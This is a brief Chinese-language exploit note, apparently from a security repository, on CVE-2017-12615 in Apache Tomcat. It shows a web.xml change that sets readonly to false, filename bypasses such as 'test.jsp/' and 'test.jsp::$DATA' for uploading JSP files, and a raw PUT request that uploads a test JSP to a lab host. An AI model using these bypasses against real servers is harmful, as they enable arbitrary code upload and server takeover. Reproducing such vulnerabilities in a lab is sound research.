# CVE-2017-12615
打开tomcat下conf\web.xml文件
找到
```
    <servlet>
        <servlet-name>default</servlet-name>
        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
        <init-param>
            <param-name>debug</param-name>
            <param-value>0</param-value>
        </init-param>
        <init-param>
            <param-name>listings</param-name>
            <param-value>false</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>

```
添加`readonly`为false
```
    <servlet>
        <servlet-name>default</servlet-name>
        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
        <init-param>
            <param-name>debug</param-name>
            <param-value>0</param-value>
        </init-param>
        <init-param>
            <param-name>listings</param-name>
            <param-value>false</param-value>
        </init-param>
		<init-param>   
            <param-name>readonly</param-name>   
            <param-value>false</param-value>   
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>

```

不能直接put jsp或者jspx文件
在windows下可以用`test.jsp/`、`test.jsp/.`、`test.jsp::$DATA`来绕过
经过测试，最新版[apache-tomcat-7.0.81](http://tomcat.apache.org/download-70.cgi)可以用`test.jsp/`、`test.jsp/.`来绕过

```
PUT /test.jsp/ HTTP/1.1
Host: 192.168.135.132:8080
Content-Length: 25

<%out.println("test");%>

```
![最新版利用](https://raw.githubusercontent.com/fupinglee/MyPython/master/exploit/CVE-2017-12615/tomcat-7.0.81.jpg)